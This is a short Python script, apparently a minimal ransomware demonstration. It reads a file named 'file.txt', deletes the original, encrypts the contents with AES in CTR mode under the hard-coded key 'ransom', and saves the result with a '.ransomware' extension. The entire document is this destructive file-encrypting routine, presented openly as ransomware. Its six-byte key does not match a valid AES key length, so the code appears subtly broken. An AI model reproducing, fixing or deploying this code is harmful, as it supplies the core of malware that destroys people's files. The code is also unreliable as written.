import os
import pyaes

file_name = 'file.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

os.remove(file_name)

key = b'ransom'
aes = pyaes.AESModeOfOperationCTR(key)
encrypt_data = aes.encrypt(file_data)

new_file = file_name + '.ransomware'
new_file = open(f'{new_file}','wb')
new_file.write(encrypt_data)
new_file.close()
